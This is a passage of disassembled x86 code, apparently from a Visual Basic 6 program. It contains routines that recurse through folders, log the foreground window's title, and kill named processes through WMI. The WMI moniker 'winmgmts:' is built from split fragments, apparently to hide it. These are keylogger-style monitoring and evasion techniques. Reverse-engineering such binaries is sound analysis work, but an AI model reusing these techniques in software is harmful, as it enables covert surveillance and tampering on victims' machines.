  mov fs:[00000000h], esp
  mov eax, 000005BCh
  call 00403890h ; ext_40109C
  push ebx
  push esi
  push edi
  mov var_18, esp
  mov var_14, 004011E0h ; "'"
  mov var_10, 00000000h
  mov var_C, 00000000h
  mov eax, Me
  mov ecx, [eax]
  mov edx, Me
  push edx
  call [ecx+00000004h]
  mov var_4, 00000001h
  mov var_4, 00000002h
  call [00401088h]
  mov var_4, 00000003h
  push FFFFFFFFh
  call [00401070h]
  mov var_4, 00000004h
  push 00000001h
  mov eax, strRootFolder
  mov ecx, [eax]
  push ecx
  call [004011B0h]
  mov edx, eax
  lea ecx, var_290
  call [004011ACh]
  push eax
  push 00418DA4h ; "\"
  call [004010B0h]
  neg eax
  sbb eax, eax
  neg eax
  neg eax
  mov var_318, ax
  lea ecx, var_290
  call [004011CCh]
  movsx edx, var_318
  test edx, edx
  jz 0043B2D5h
  mov var_4, 00000005h
  mov eax, strRootFolder
  mov ecx, [eax]
  push ecx
  push 00418DA4h ; "\"
  call [00401044h]
  mov edx, eax
  mov ecx, strRootFolder
  call [004011ACh]
  mov var_4, 00000007h
  lea edx, var_28C
  push edx
  lea eax, var_468
  push eax
  push 00418AD4h ; UDT_2_00418AD4
  call [004010D4h]
  push eax
  mov ecx, strRootFolder
  mov edx, [ecx]
  push edx
  push 00418DACh ; "*"
  call [00401044h]
  mov edx, eax
  lea ecx, var_290
  call [004011ACh]
  push eax
  lea eax, var_294
  push eax
  call [00401188h]
  push eax
  call 00418B30h ; FindFirstFile(%x1v, %x2v)
  mov var_314, eax
  call [00401054h]
  lea ecx, var_468
  push ecx
  lea edx, var_28C
  push edx
  push 00418AD4h ; UDT_2_00418AD4
  call [00401038h]
  mov eax, var_314
  mov var_34, eax
  lea ecx, var_294
  push ecx
  lea edx, var_290
  push edx
  push 00000002h
  call [00401150h]
  add esp, 0000000Ch
  mov var_4, 00000008h
  cmp var_34, FFFFFFFFh
  jnz 0043B382h
  jmp 0043BA91h
  mov var_4, 0000000Bh
  mov var_38, 00000001h
  mov var_4, 0000000Ch
  cmp var_38, 00000000h
  jz 0043BA7Bh
  mov var_4, 0000000Dh
  lea eax, var_260
  push eax
  push 00000104h
  call [0040108Ch]
  mov edx, eax
  lea ecx, var_290
  call [004011ACh]
  lea ecx, var_294
  push ecx
  lea edx, var_290
  push edx
  mov eax, Me
  mov ecx, [eax]
  mov edx, Me
  push edx
  call [ecx+00000700h]
  mov eax, var_290
  push eax
  lea ecx, var_260
  push ecx
  push 00000104h
  call [0040104Ch]
  mov edx, var_294
  mov var_5C0, edx
  mov var_294, 00000000h
  mov edx, var_5C0
  lea ecx, var_3C
  call [004011ACh]
  lea ecx, var_290
  call [004011CCh]
  mov var_4, 0000000Eh
  lea eax, var_58
  push eax
  push 0000000Eh
  call [0040108Ch]
  mov edx, eax
  lea ecx, var_290
  call [004011ACh]
  lea ecx, var_294
  push ecx
  lea edx, var_290
  push edx
  mov eax, Me
  mov ecx, [eax]
  mov edx, Me
  push edx
  call [ecx+00000700h]
  mov eax, var_290
  push eax
  lea ecx, var_58
  push ecx
  push 0000000Eh
  call [0040104Ch]
  mov edx, var_294
  mov var_5C4, edx
  mov var_294, 00000000h
  mov eax, var_5C4
  mov var_2A4, eax
  mov var_2AC, 00000008h
  lea edx, var_2AC
  lea ecx, var_30
  call [00401010h]
  lea ecx, var_290
  call [004011CCh]
  mov var_4, 0000000Fh
  mov ecx, var_28C
  and ecx, 00000010h
  cmp ecx, 00000010h
  jnz 0043B5ABh
  mov var_4, 00000010h
  mov edx, var_3C
  push edx
  push 00418DB4h ; "."
  call [004010B0h]
  mov esi, eax
  neg esi
  sbb esi, esi
  inc esi
  mov eax, var_3C
  push eax
  push 00418DBCh ; ".."
  call [004010B0h]
  neg eax
  sbb eax, eax
  inc eax
  or esi, eax
  test esi, esi
  jnz 0043B5A6h
  mov var_4, 00000011h
  mov ecx, strRootFolder
  mov edx, [ecx]
  push edx
  mov eax, var_3C
  push eax
  call [00401044h]
  mov edx, eax
  lea ecx, var_290
  call [004011ACh]
  mov ecx, strFile
  push ecx
  mov edx, strFolder
  push edx
  lea eax, var_290
  push eax
  mov ecx, Me
  mov edx, [ecx]
  mov eax, Me
  push eax
  call [edx+000006F8h]
  mov var_318, eax
  cmp var_318, 00000000h
  jge 0043B590h
  push 000006F8h
  push 00418934h
  mov ecx, Me
  push ecx
  mov edx, var_318
  push edx
  call [00401058h]
  mov var_5C8, eax
  jmp 0043B59Ah
  mov var_5C8, 00000000h
  lea ecx, var_290
  call [004011CCh]
  jmp 0043BA1Eh
  mov var_4, 00000014h
  mov eax, strRootFolder
  mov ecx, [eax]
  push ecx
  mov edx, strFolder
  mov eax, [edx]
  push eax
  call [00401074h]
  movsx ecx, ax
  test ecx, ecx
  jz 0043BA1Eh
  mov var_4, 00000015h
  mov edx, var_3C
  push edx
  mov eax, strFile
  mov ecx, [eax]
  push ecx
  call [00401074h]
  movsx edx, ax
  test edx, edx
  jz 0043BA1Eh
  mov var_4, 00000016h
  mov eax, Me
  mov ecx, [eax]
  mov edx, Me
  push edx
  call [ecx+0000030Ch]
  push eax
  lea eax, var_29C
  push eax
  call [00401078h]
  mov var_320, eax
  mov ecx, Me
  mov edx, [ecx]
  mov eax, Me
  push eax
  call [edx+0000030Ch]
  push eax
  lea ecx, var_298
  push ecx
  call [00401078h]
  mov var_318, eax
  lea edx, var_310
  push edx
  mov eax, var_318
  mov ecx, [eax]
  mov edx, var_318
  push edx
  call [ecx+000000D8h]
  fnclex
  mov var_31C, eax
  cmp var_31C, 00000000h
  jge 0043B691h
  push 000000D8h
  push 00418DC4h
  mov eax, var_318
  push eax
  mov ecx, var_31C
  push ecx
  call [00401058h]
  mov var_5CC, eax
  jmp 0043B69Bh
  mov var_5CC, 00000000h
  mov dx, var_310
  sub dx, 0001h
  jo 0043BB2Eh
  push edx
  mov eax, var_320
  mov ecx, [eax]
  mov edx, var_320
  push edx
  call [ecx+000000E4h]
  fnclex
  mov var_324, eax
  cmp var_324, 00000000h
  jge 0043B6F9h
  push 000000E4h
  push 00418DC4h
  mov eax, var_320
  push eax
  mov ecx, var_324
  push ecx
  call [00401058h]
  mov var_5D0, eax
  jmp 0043B703h
  mov var_5D0, 00000000h
  lea edx, var_29C
  push edx
  lea eax, var_298
  push eax
  push 00000002h
  call [0040102Ch]
  add esp, 0000000Ch
  mov var_4, 00000017h
  mov ecx, strRootFolder
  mov var_2F4, ecx
  mov var_2FC, 00004008h
  push 00000006h
  lea edx, var_2FC
  push edx
  lea eax, var_2AC
  push eax
  call [004011A4h]
  mov ecx, Me
  mov edx, [ecx]
  mov eax, Me
  push eax
  call [edx+00000310h]
  push eax
  lea ecx, var_298
  push ecx
  call [00401078h]
  mov var_318, eax
  lea edx, var_290
  push edx
  mov eax, var_318
  mov ecx, [eax]
  mov edx, var_318
  push edx
  call [ecx+000000F8h]
  fnclex
  mov var_31C, eax
  cmp var_31C, 00000000h
  jge 0043B7C2h
  push 000000F8h
  push 00418DC4h
  mov eax, var_318
  push eax
  mov ecx, var_31C
  push ecx
  call [00401058h]
  mov var_5D4, eax
  jmp 0043B7CCh
  mov var_5D4, 00000000h
  mov edx, var_290
  push edx
  push 00418DD8h ; "$RE"
  call [00401044h]
  mov var_2B4, eax
  mov var_2BC, 00008008h
  mov eax, Me
  mov ecx, [eax]
  mov edx, Me
  push edx
  call [ecx+0000030Ch]
  push eax
  lea eax, var_29C
  push eax
  call [00401078h]
  mov var_320, eax
  lea ecx, var_294
  push ecx
  mov edx, var_320
  mov eax, [edx]
  mov ecx, var_320
  push ecx
  call [eax+000000F8h]
  fnclex
  mov var_324, eax
  cmp var_324, 00000000h
  jge 0043B864h
  push 000000F8h
  push 00418DC4h
  mov edx, var_320
  push edx
  mov eax, var_324
  push eax
  call [00401058h]
  mov var_5D8, eax
  jmp 0043B86Eh
  mov var_5D8, 00000000h
  mov ecx, strRootFolder
  mov edx, [ecx]
  push edx
  mov eax, var_294
  push eax
  call [004010B0h]
  neg eax
  sbb eax, eax
  inc eax
  neg eax
  not ax
  mov var_304, ax
  mov var_30C, 0000000Bh
  lea ecx, var_2AC
  push ecx
  lea edx, var_2BC
  push edx
  lea eax, var_2CC
  push eax
  call [00401174h]
  push eax
  lea ecx, var_2DC
  push ecx
  call [00401154h]
  push eax
  lea edx, var_30C
  push edx
  lea eax, var_2EC
  push eax
  call [004010E4h]
  push eax
  call [00401090h]
  mov var_328, ax
  lea ecx, var_294
  push ecx
  lea edx, var_290
  push edx
  push 00000002h
  call [00401150h]
  add esp, 0000000Ch
  lea eax, var_29C
  push eax
  lea ecx, var_298
  push ecx
  push 00000002h
  call [0040102Ch]
  add esp, 0000000Ch
  lea edx, var_30C
  push edx
  lea eax, var_2BC
  push eax
  lea ecx, var_2AC
  push ecx
  push 00000003h
  call [00401024h]
  add esp, 00000010h
  movsx edx, var_328
  test edx, edx
  jz 0043BA1Eh
  mov var_4, 00000018h
  mov eax, Me
  mov ecx, [eax]
  mov edx, Me
  push edx
  call [ecx+0000030Ch]
  push eax
  lea eax, var_298
  push eax
  call [00401078h]
  mov var_318, eax
  mov var_2F4, 80020004h
  mov var_2FC, 0000000Ah
  mov eax, 00000010h
  call 00403890h ; ext_40109C
  mov ecx, esp
  mov edx, var_2FC
  mov [ecx], edx
  mov eax, var_2F8
  mov [ecx+00000004h], eax
  mov edx, var_2F4
  mov [ecx+00000008h], edx
  mov eax, var_2F0
  mov [ecx+0000000Ch], eax
  mov ecx, strRootFolder
  mov edx, [ecx]
  push edx
  mov eax, var_318
  mov ecx, [eax]
  mov edx, var_318
  push edx
  call [ecx+000001ECh]
  fnclex
  mov var_31C, eax
  cmp var_31C, 00000000h
  jge 0043BA08h
  push 000001ECh
  push 00418DC4h
  mov eax, var_318
  push eax
  mov ecx, var_31C
  push ecx
  call [00401058h]
  mov var_5DC, eax
  jmp 0043BA12h
  mov var_5DC, 00000000h
  lea ecx, var_298
  call [004011D4h]
  mov var_4, 0000001Dh
  lea edx, var_28C
  push edx
  lea eax, var_5A8
  push eax
  push 00418AD4h ; UDT_2_00418AD4
  call [004010D4h]
  push eax
  mov ecx, var_34
  push ecx
  call 00418B90h ; FindNextFile(%x1v, %x2v)
  mov var_314, eax
  call [00401054h]
  lea edx, var_5A8
  push edx
  lea eax, var_28C
  push eax
  push 00418AD4h ; UDT_2_00418AD4
  call [00401038h]
  mov ecx, var_314
  mov var_38, ecx
  jmp 0043B390h
  mov var_4, 0000001Fh
  mov edx, var_34
  push edx
  call 00418BD4h ; FindClose(%x1v)
  call [00401054h]
  push 0043BB0Ch
  jmp 0043BAF9h
  lea eax, var_294
  push eax
  lea ecx, var_290
  push ecx
  push 00000002h
  call [00401150h]
  add esp, 0000000Ch
  lea edx, var_29C
  push edx
  lea eax, var_298
  push eax
  push 00000002h
  call [0040102Ch]
  add esp, 0000000Ch
  lea ecx, var_2EC
  push ecx
  lea edx, var_2DC
  push edx
  lea eax, var_2CC
  push eax
  lea ecx, var_2BC
  push ecx
  lea edx, var_2AC
  push edx
  push 00000005h
  call [00401024h]
  add esp, 00000018h
  ret
  lea ecx, var_30
  call [00401014h]
  lea ecx, var_3C
  call [004011CCh]
  ret
  mov eax, Me
  mov ecx, [eax]
  mov edx, Me
  push edx
  call [ecx+00000008h]
  mov eax, var_10
  mov ecx, var_20
  mov fs:[00000000h], ecx
  pop edi
  pop esi
  pop ebx
  mov esp, ebp
  pop ebp
  retn 0010h
End Sub

Public Function TypeWindow(arg_C) '43BE80
  push ebp
  mov ebp, esp
  sub esp, 0000000Ch
  push 00403896h ; ext_4010EC
  mov eax, fs:[00000000h]
  push eax
  mov fs:[00000000h], esp
  sub esp, 00000084h
  push ebx
  push esi
  push edi
  mov var_C, esp
  mov var_8, 004012A0h
  xor ebx, ebx
  mov var_4, ebx
  mov edi, Me
  push edi
  mov eax, [edi]
  call [eax+00000004h]
  mov ecx, arg_C
  mov var_24, ebx
  mov var_3C, ebx
  mov var_40, ebx
  mov var_44, ebx
  mov var_48, ebx
  mov var_4C, ebx
  mov var_50, ebx
  mov var_54, ebx
  mov var_64, ebx
  mov var_74, ebx
  mov [ecx], ebx
  call 00418C84h ; GetForegroundWindow()
  mov esi, eax
  call [00401054h]
  push esi
  mov var_28, esi
  mov [edi+00000038h], esi
  call 00418CD4h ; GetWindowTextLength(%x1v)
  mov esi, eax
  call [00401054h]
  add esi, 00000001h
  lea edx, var_64
  jo 0043C219h
  push esi
  push edx
  call [004010A4h]
  lea eax, var_64
  push eax
  call [0040101Ch]
  mov edx, eax
  lea ecx, var_40
  call [004011ACh]
  lea ecx, var_64
  call [00401014h]
  mov ecx, var_40
  push esi
  lea edx, var_44
  push ecx
  push edx
  call [00401188h]
  push eax
  mov eax, var_28
  push eax
  call 00418D1Ch ; GetWindowText(%x1v, %x2v, %x3v)
  mov esi, eax
  call [00401054h]
  mov ecx, var_44
  lea edx, var_40
  push ecx
  push edx
  call [004010F4h]
  lea edx, var_74
  lea ecx, var_24
  mov var_6C, esi
  mov var_74, 00000003h
  call [00401010h]
  lea ecx, var_44
  call [004011CCh]
  mov ecx, var_40
  lea eax, var_40
  push ecx
  mov var_6C, eax
  mov var_74, 00004008h
  call [00401018h]
  sub eax, 00000001h
  lea edx, var_74
  jo 0043C219h
  push eax
  push edx
  lea eax, var_64
  push eax
  call [004011A4h]
  lea ecx, var_64
  push ecx
  call [0040101Ch]
  mov edx, eax
  lea ecx, var_40
  call [004011ACh]
  lea ecx, var_64
  call [00401014h]
  mov edx, var_40
  lea eax, [edi+00000034h]
  mov var_94, eax
  push edx
  mov eax, [eax]
  push eax
  call [004010B0h]
  test eax, eax
  jz 0043C186h
  mov ecx, [edi]
  push edi
  call [ecx+00000340h]
  lea edx, var_50
  push eax
  push edx
  call [00401078h]
  mov esi, eax
  lea ecx, var_44
  push ecx
  push esi
  mov eax, [esi]
  call [eax+000000A0h]
  cmp eax, ebx
  fnclex
  jge 0043C024h
  push 000000A0h
  push 00418EA4h
  push esi
  push eax
  call [00401058h]
  mov edx, var_44
  push edx
  push 00418DE4h
  call [004010B0h]
  mov esi, eax
  lea ecx, var_44
  neg esi
  sbb esi, esi
  neg esi
  neg esi
  call [004011CCh]
  lea ecx, var_50
  call [004011D4h]
  cmp si, bx
  jz 0043C133h
  mov eax, [edi]
  push edi
  call [eax+00000340h]
  mov esi, [00401078h]
  lea ecx, var_54
  push eax
  push ecx
  call global_00401078
  mov edx, [edi]
  push edi
  mov var_84, eax
  call [edx+00000340h]
  push eax
  lea eax, var_50
  push eax
  call global_00401078
  mov esi, eax
  lea edx, var_44
  push edx
  push esi
  mov ecx, [esi]
  call [ecx+000000A0h]
  cmp eax, ebx
  fnclex
  jge 0043C0ABh
  push 000000A0h
  push 00418EA4h
  push esi
  push eax
  call [00401058h]
  mov ecx, var_44
  mov eax, var_84
  push ecx
  push 00418EB8h ; vbCrLf
  mov esi, [eax]
  call [00401044h]
  mov edx, eax
  lea ecx, var_48
  call [004011ACh]
  push eax
  push 00418EB8h ; vbCrLf
  call [00401044h]
  mov edx, eax
  lea ecx, var_4C
  call [004011ACh]
  mov edx, esi
  mov esi, var_84
  push eax
  push esi
  call [edx+000000A4h]
  cmp eax, ebx
  fnclex
  jge 0043C10Ch
  push 000000A4h
  push 00418EA4h
  push esi
  push eax
  call [00401058h]
  lea eax, var_4C
  lea ecx, var_48
  push eax
  lea edx, var_44
  push ecx
  push edx
  push 00000003h
  call [00401150h]
  lea eax, var_54
  lea ecx, var_50
  push eax
  push ecx
  push 00000002h
  call [0040102Ch]
  add esp, 0000001Ch
  mov edx, [edi]
  push edi
  call [edx+00000340h]
  push eax
  lea eax, var_50
  push eax
  call [00401078h]
  mov edx, var_40
  mov esi, eax
  push edx
  push esi
  mov ecx, [esi]
  call [ecx+000000A4h]
  cmp eax, ebx
  fnclex
  jge 0043C16Eh
  push 000000A4h
  push 00418EA4h
  push esi
  push eax
  call [00401058h]
  lea ecx, var_50
  call [004011D4h]
  mov edx, var_40
  mov ecx, var_94
  call [00401148h]
  push 0043C1E0h
  jmp 0043C1CDh
  test var_4, 04h
  jz 0043C19Ch
  lea ecx, var_3C
  call [00401014h]
  lea eax, var_4C
  lea ecx, var_48
  push eax
  lea edx, var_44
  push ecx
  push edx
  push 00000003h
  call [00401150h]
  lea eax, var_54
  lea ecx, var_50
  push eax
  push ecx
  push 00000002h
  call [0040102Ch]
  add esp, 0000001Ch
  lea ecx, var_64
  call [00401014h]
  ret
  lea ecx, var_24
  call [00401014h]
  lea ecx, var_40
  call [004011CCh]
  ret
  mov eax, Me
  push eax
  mov edx, [eax]
  call [edx+00000008h]
  mov eax, arg_C
  mov ecx, var_3C
  mov edx, var_38
  mov [eax], ecx
  mov ecx, var_34
  mov [eax+00000004h], edx
  mov edx, var_30
  mov [eax+00000008h], ecx
  mov [eax+0000000Ch], edx
  mov eax, var_4
  mov ecx, var_14
  pop edi
  pop esi
  mov fs:[00000000h], ecx
  pop ebx
  mov esp, ebp
  pop ebp
  retn 0008h
End Function

Private Sub Proc_0_15_43BB40(arg_C, arg_10) '43BB40
  push ebp
  mov ebp, esp
  sub esp, 0000000Ch
  push 00403896h ; ext_4010EC
  mov eax, fs:[00000000h]
  push eax
  mov fs:[00000000h], esp
  sub esp, 00000040h
  push ebx
  push esi
  push edi
  mov var_C, esp
  mov var_8, 00401280h
  mov eax, arg_10
  mov edi, arg_C
  xor ebx, ebx
  lea edx, var_2C
  mov [eax], ebx
  mov ecx, [edi]
  push ebx
  push edx
  mov var_1C, ebx
  mov var_2C, ebx
  mov var_3C, ebx
  mov var_44, ecx
  mov var_4C, 00000008h
  call [00401104h]
  lea eax, var_4C
  push 00000001h
  lea ecx, var_2C
  push eax
  push ecx
  lea edx, var_3C
  push ebx
  push edx
  call [00401114h]
  push eax
  call [00401170h]
  mov esi, eax
  lea eax, var_3C
  lea ecx, var_2C
  push eax
  push ecx
  push 00000002h
  call [00401024h]
  add esp, 0000000Ch
  cmp esi, 00000001h
  jnz 0043BBDEh
  mov edx, 00418DE4h
  lea ecx, var_1C
  call [00401148h]
  push 0043BC39h
  jmp 0043BC38h
  cmp esi, ebx
  jle 0043BC03h
  mov edx, [edi]
  sub esi, 00000001h
  jo 0043BC56h
  push esi
  push edx
  call [0040119Ch]
  mov edx, eax
  lea ecx, var_1C
  call [004011ACh]
  push 0043BC39h
  jmp 0043BC38h
  mov edx, [edi]
  lea ecx, var_1C
  call [00401148h]
  push 0043BC39h
  jmp 0043BC38h
  test var_4, 04h
  jz 0043BC24h
  lea ecx, var_1C
  call [004011CCh]
  lea eax, var_3C
  lea ecx, var_2C
  push eax
  push ecx
  push 00000002h
  call [00401024h]
  add esp, 0000000Ch
  ret
  ret
  mov edx, arg_10
  mov eax, var_1C
  mov ecx, var_14
  pop edi
  mov [edx], eax
  pop esi
  xor eax, eax
  mov fs:[00000000h], ecx
  pop ebx
  mov esp, ebp
  pop ebp
  retn 000Ch
End Sub

Private Sub Proc_0_16_43BC60(arg_C) '43BC60
  push ebp
  mov ebp, esp
  sub esp, 00000008h
  push 00403896h ; ext_4010EC
  mov eax, fs:[00000000h]
  push eax
  mov fs:[00000000h], esp
  sub esp, 000000A0h
  push ebx
  push esi
  push edi
  mov var_8, esp
  mov var_4, 00401290h
  mov eax, arg_C
  mov edi, [00401044h]
  xor esi, esi
  push 00418DECh ; "Select Name from Win32_Process Where Name = '"
  mov ecx, [eax]
  mov var_14, esi
  push ecx
  mov var_18, esi
  mov var_1C, esi
  mov var_20, esi
  mov var_30, esi
  mov var_40, esi
  mov var_50, esi
  mov var_60, esi
  mov var_70, esi
  mov var_80, esi
  mov var_A4, esi
  mov var_A8, esi
  call edi
  mov ebx, [004011ACh]
  mov edx, eax
  lea ecx, var_18
  call ebx
  push eax
  push 00418E4Ch ; "'"
  call edi
  push 00418E54h
  push 00418E5Ch ; "inm"
  mov var_58, eax
  mov var_60, 00000008h
  mov var_38, 80020004h
  mov var_40, 0000000Ah
  call edi
  mov edx, eax
  lea ecx, var_1C
  call ebx
  push eax
  push 00418E68h ; "gm"
  call edi
  mov edx, eax
  lea ecx, var_20
  call ebx
  push eax
  push 00418E74h ; "ts:"
  call edi
  mov var_28, eax
  lea edx, var_40
  lea eax, var_30
  push edx
  lea ecx, var_50
  push eax
  push ecx
  mov var_30, 00000008h
  call [0040103Ch]
  mov eax, var_60
  mov ecx, var_5C
  sub esp, 00000010h
  mov edx, esp
  push 00000001h
  push 00418E7Ch ; "ExecQuery"
  mov [edx], eax
  mov eax, var_58
  mov [edx+00000004h], ecx
  mov ecx, var_54
  mov [edx+00000008h], eax
  lea eax, var_80
  mov [edx+0000000Ch], ecx
  lea edx, var_50
  push edx
  push eax
  call [00401198h]
  add esp, 00000020h
  push eax
  call [004010C0h]
  push eax
  lea ecx, var_A4
  push ecx
  call [00401080h]
  push eax
  lea edx, var_14
  lea eax, var_A8
  push edx
  push eax
  call [00401048h]
  lea ecx, var_20
  mov edi, eax
  lea edx, var_1C
  push ecx
  lea eax, var_18
  push edx
  push eax
  push 00000003h
  call [00401150h]
  lea ecx, var_80
  lea edx, var_50
  push ecx
  lea eax, var_60
  push edx
  lea ecx, var_40
  push eax
  lea edx, var_30
  push ecx
  push edx
  push 00000005h
  call [00401024h]
  mov ebx, [00401184h]
  add esp, 00000028h
  cmp edi, esi
  jz 0043BDFCh
  mov eax, var_14
  push esi
  push 00418E90h ; "Terminate"
  push eax
  call ebx
  add esp, 0000000Ch
  lea ecx, var_14
  lea edx, var_A8
  push ecx
  push edx
  call [004011C0h]
  mov edi, eax
  jmp 0043BDD4h
  push 0043BE5Eh
  jmp 0043BE3Bh
  lea eax, var_20
  lea ecx, var_1C
  push eax
  lea edx, var_18
  push ecx
  push edx
  push 00000003h
  call [00401150h]
  lea eax, var_80
  lea ecx, var_70
  push eax
  lea edx, var_60
  push ecx
  lea eax, var_50
  push edx
  lea ecx, var_40
  push eax
  lea edx, var_30
  push ecx
  push edx
  push 00000006h
  call [00401024h]
  add esp, 0000002Ch
  ret
  lea eax, var_A8
  lea ecx, var_A4
  push eax
  push ecx
  push 00000002h
  call [0040102Ch]
  add esp, 0000000Ch
  lea ecx, var_14
  call [004011D4h]
  ret
  mov ecx, var_10
  pop edi
  pop esi
  xor eax, eax
  mov fs:[00000000h], ecx
  pop ebx
  mov esp, ebp
  pop ebp
  retn 0008h
End Sub
